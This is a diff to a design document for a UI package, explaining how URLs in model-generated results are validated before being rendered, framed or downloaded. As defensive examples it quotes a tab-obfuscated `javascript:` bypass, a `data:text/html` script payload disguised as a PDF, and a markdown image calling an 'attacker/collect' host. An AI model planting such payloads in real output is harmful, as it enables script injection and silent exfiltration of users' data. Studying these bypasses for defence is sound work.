@@ -141,15 +141,72 @@ None of this is a heuristic about the data. Every branch reads the descriptor: t
 
 ## Files
 
-**A document offers a preview when the browser can both fetch and render it.** Two conditions, both necessary: `isViewableUrl` (a `pipelex-storage://` reference resolves nowhere without the host's resolver) and a format a browser renders unaided. A `.docx` satisfies the first and not the second, and a preview that opens onto a download prompt is worse than none.
-
-**A framed URL is not the `native.Html` question, and the difference is the origin.** Markup goes through a sandbox because injecting it into the host's document would run it ON the host's origin with the host's cookies. A URL in an `<iframe>` is a separate document at its own origin by construction — the browser's own boundary, not one this package has to build. So a PDF is framed the way every document viewer on the web frames one, with `no-referrer`, because a result view has no business telling a third party where it was opened from.
+**A document offers a preview when the browser can both frame and render it.** Two conditions, both necessary: `frameableUrl` (a `pipelex-storage://` reference resolves nowhere without the host's resolver, and a `data:` document is never framed — see [The URL policy](#the-url-policy)) and a format a browser renders unaided. A `.docx` satisfies the first and not the second, and a preview that opens onto a download prompt is worse than none. Which formats are worth framing is read from the payload's declared type, and that is the right source: whether a preview is worth OFFERING is a usability question, and the producer is the one that knows. What the declared type may not do is admit a URL.
 
 **A file always exposes its URL, three ways.** A picture is a _preview_ of a file, not a replacement for it — once the image painted, the URL used to vanish entirely, leaving a result you could look at and could not use. So a painted image is wrapped in a link to the file it previews, its reference is printed beneath it, and the reference carries a copy control.
 
 **A file is NAMED rather than printed whole.** Ninety characters of UUID and hash wrapped across the panel says one thing, and the thing it says is "this is a file"; the last path segment is what a person reads. The two requirements pull opposite ways — a name alone cannot be pasted into a terminal — and the copy control is what resolves them: **the label is the name, the button is the URL**. It hides itself where `navigator.clipboard` is undefined (outside a secure context), because a button that does nothing is worse than no button; the link and the `title` still carry the reference there.
 
 **A gallery of nothing is not a gallery.** When no image in a list can be painted — every URL a storage reference the host has no resolver for — the grid becomes rows, because three large blanks say less than three lines do. The layout follows what is actually showable rather than what the kind promises.
+
+## The URL policy
+
+Every URL in a payload is model-adjacent data. The runtime put it there, but what it holds came out of a run, and this view hands it to sinks that fetch, paint, frame, navigate and download. So there is one gate, it is in core, and every sink reads it.
+
+**One predicate, parsed rather than prefix-matched.** `viewableUrl` in `src/core/native-content.ts` is the whole answer, and `isViewableUrl` is the type guard over it. It first strips what the WHATWG URL parser strips — leading and trailing C0 controls and spaces, every internal tab, line feed and carriage return — then parses and branches on the protocol the parser reports:
+
+| Scheme | Verdict |
+| --- | --- |
+| `http:`, `https:` | viewable |
+| `blob:` | viewable — a blob URL is bound to the origin that minted it, so a payload cannot forge one pointing elsewhere |
+| `data:` | viewable only for `image/png`, `image/jpeg`, `image/gif`, `image/webp`, `image/avif` and `application/pdf` |
+| a root-relative path | viewable when resolving it against a sentinel origin STAYS on that origin |
+| everything else | not viewable — `javascript:`, `file:`, `pipelex-storage:`, `data:text/html`, `data:image/svg+xml` |
+
+The `data:` arm is an allow-list because the question is "can this paint without executing", and only a closed set answers it. `application/pdf` is in it because the input control previews a `data:application/pdf` value a storage-less host wrote back, through an `<object>`, and reads this same predicate to decide. `image/svg+xml` is out because an SVG paints as a picture and *executes* as a document the moment it is opened in a tab — which is one click away from every image this view paints, since a painted image is wrapped in a link to itself.
+
+Stripping before parsing also closes the oldest bypass of a prefix match: `java\tscript:alert(1)` is a URL the browser strips into `javascript:` and runs, and a `/^javascript:/` test never saw one. Normalising first and branching on the parsed protocol handles it structurally, rather than by adding a pattern per trick.
+
+The path arm settles four spellings. `//host/x` is protocol-relative and points at another origin while looking like a path; the URL parser reads `\\host\x` and `/\host/x` the same way. All three are refused on the SPELLING — a second character of `/` or `\` — and `/api/assets/x` is kept, where a regex needed an arm per spelling and had none for the backslashes. The sentinel-origin check stays behind that as a second answer, but it cannot be the only one: "did it stay on the sentinel" reads as the protocol-relative rule and is blind in exactly one place, the sentinel's own host, so `//url-gate.invalid/x` passed the test written to stop it.
+
+**The sentinel is scaffolding, and never a destination.** Whether a candidate carries a scheme is read off the STRING, by RFC 3986's grammar, before any base is applied — because the parser resolves a candidate whose scheme equals the base's *against* that base. Deciding it instead with a second, base-less parse let the two disagree: `https:cdn.example/x.png` is a legal URL a browser resolves against the page, and the gate returned `https://url-gate.invalid/cdn.example/x.png` — the internal placeholder, in a real `<img src>`, in place of a URL that worked.
+
+**The string that was judged is the string that is used.** `viewableUrl` returns the normalised URL rather than a yes or no, and every sink takes what it returned. This is not tidiness. `" https://cdn/x.png"` parses as `https:` and fails `/^https?:/`, so a host that validated `public_url` by parsing and a kernel that prefix-matched disagreed about which member was acceptable — the kernel skipped the validated one and painted `url`, which nothing had validated. Returning the judged string makes that disagreement unrepresentable, and it is why a host that wants to pre-judge a payload should call `viewableUrl` rather than restate it.
+
+**A frame is stricter than a paint, and the reason is the origin.** `frameableUrl` admits `http:` and `https:` from anyone, and a same-origin path only from the host's RESOLVER. Markup goes through a sandbox because injecting it into the host's document would run it ON the host's origin with the host's cookies; a URL in an `<iframe>` is a separate document at its own origin, which is the browser's own boundary rather than one this package builds. **That argument is sound, and it used to be applied to a URL nobody had checked.** A `data:` document does not get an origin of its own — it inherits the embedder's — so `{url: "data:text/html,<script>…", filename: "report.pdf"}` was framed on the strength of its own filename, at the host's origin, with the host's cookies. Restricting the scheme restores the premise instead of compensating for its absence. A refused scheme costs a reader nothing: a raster `data:` URL is painted by the image arm, and a run does not return an inline PDF.
+
+**A root-relative path carries no origin of its own either, which is why provenance decides it.** It is the embedding page's origin by construction — exactly what the resolver case (`/api/assets/…`) wants, and exactly what a payload must not be handed. Whether a preview is worth OFFERING is read from the declared type, and that type gate admits every `image/` subtype, SVG included; so a payload naming `{url: "/api/assets/x.svg", mime_type: "image/svg+xml"}` got a document with a DOM on the host's origin, and the `data:` SVG ban two paragraphs up was being paid around one function later. `paintable` already asks the resolver first, so it knows which answer it is holding and says so: a payload member must be `http:` or `https:` to be framed, while a host that resolves onto its own origin is choosing its own origin, which it is entitled to do. That entitlement is the residual risk the resolver contract names — see [upload-seam.md](upload-seam.md).
+
+**The frame carries no `sandbox` attribute, and that is a platform constraint rather than a preference.** Measured against a same-origin PDF on Chrome 152 and Firefox 155:
+
+| `sandbox` | Chrome 152 | Firefox 155 |
+| --- | --- | --- |
+| attribute absent | renders | renders |
+| `""` | broken-document icon | viewer chrome, blank page |
+| `allow-same-origin` | broken-document icon | viewer chrome, blank page |
+| `allow-scripts` | broken-document icon | renders |
+| `allow-same-origin allow-scripts` | broken-document icon | renders |
+| `allow-downloads` | broken-document icon | viewer chrome, blank page |
+
+The two fail for different reasons. The attribute sets the HTML specification's *sandboxed plugins browsing context flag* unconditionally and no token unsets it — `allow-plugins` was never adopted — and Chrome's PDF viewer is plugin content, so every token set fails there, the maximal one included, which is what identifies the flag as the cause rather than a missing capability. Firefox's pdf.js is not plugin content but a JavaScript viewer, so it renders exactly when `allow-scripts` is granted. **The intersection is empty: the only column that renders in both is no `sandbox` attribute at all.**
+
+The Firefox result is the one that survives a browser changing its mind. The token it requires is `allow-scripts` — a frame sandboxed to permit only script execution is strictly worse than a frame with no sandbox attribute — so there is no version of this where a sandbox is the right tool. It would delete the preview for the commonest document a run returns, or cost the one token that matters and buy nothing. The scheme gate above is what makes the frame safe, and it is enough. (Safari was not measured: it has no headless screenshot mode. Its answer cannot widen an already-empty intersection.)
+
+**Nothing this package paints tells a third party where it was painted.** Every `<img>` and the document frame carry `referrerPolicy="no-referrer"` — the result view's images, the input control's preview, the generative layer's brand logos. A result view has no business leaking the page it was opened from, and a payload's image URL is a third party by default.
+
+**A prose image does not phone home on paint.** `![](https://attacker/collect?…)` in a `prose` value is a request the browser makes as the result is painted — before anyone has read a word, with no click and no consent — and the entire content of that value is model output. So by default a markdown image renders as a **link** carrying its alt text (or the URL, when the model wrote none): nothing the model put there is lost, and the fetch waits for a reader who wants it. Inside a link it stays plain text instead, because `[![alt](img)](href)` — the linked-thumbnail spelling, which models write constantly — is a link token holding an image token, and an anchor inside an anchor is not valid HTML: the parser un-nests the pair into siblings, so a server-rendered page and the hydrated tree disagree and the visible link points at the image rather than the destination. Under the opt-in nothing has to change, because an `<img>` nests inside an anchor perfectly well. A host that knows where its prose images come from opts in once, on the provider:
+
+```tsx
+<ResultEnvProvider proseImages="load">…</ResultEnvProvider>
+```
+
+`Markdown` takes the same prop directly, and the prop wins over the provider. Either way only `http:` and `https:` are ever painted or linked — a `data:` image is refused in prose even for a type the file arms would paint, because a model's answer is not where an inline image arrives.
+
+**A link keeps its own, wider policy, because a link needs a click.** `http:`, `https:`, `mailto:`, a fragment, and a same-origin path judged by the same sentinel rule as above. Which hosts a reader may be sent to is a host's allow-list to keep, not this package's — and a refused href keeps its TEXT, because dropping the anchor and dropping the words are different things and only the first is a security decision.
+
+**The download path judges before it acts.** `downloadStuff` passes each candidate through the same gate, in the same durability order, and uses what comes back. It both fetches a URL and, when the fetch fails, hands it to `window.open` — which is a navigation, and was the one sink with no gate in front of it at all. A file whose reference nothing accepts is skipped rather than guessed at; the JSON receipt is still written, so the reader keeps the reference even when they cannot be handed the bytes.
+
+**What this is deliberately not.** Not a host allow-list: which origins a host trusts is the host's policy, and the kernel's job is to hand a sink only a URL whose scheme and media type cannot execute. Not a refusal of cleartext `http:`: a host developing against a local runner paints `http://localhost:…`, and mixed-content blocking is the browser's own policy on an HTTPS page. Not a sanitizer, and not a schema read — nothing here inspects a payload to work out what kind it is.
 
 ## Markup
 
@@ -171,7 +228,7 @@ The readers are the standard's own — `readHtmlContent`, `readDateContent`, `re
 
 ## Why the readers live in core
 
-Same reason `file-formats.ts` does: a host that renders a result its own way needs the same answer the control uses, and two copies of an answer is two places for it to drift. `isViewableUrl` is the clearest case — the input control asks it to decide whether to fetch a preview, the result view asks it to decide whether to paint an `<img>`, and those are the same question. It is defined once and both read it.
+Same reason `file-formats.ts` does: a host that renders a result its own way needs the same answer the control uses, and two copies of an answer is two places for it to drift. `viewableUrl` is the clearest case — the input control asks it to decide whether to fetch a preview, the result view asks it to decide whether to paint an `<img>`, the download path asks it before it fetches or navigates, and those are the same question. It is defined once and all of them read it; see [The URL policy](#the-url-policy).
 
 ## What a result view deliberately does NOT do
 
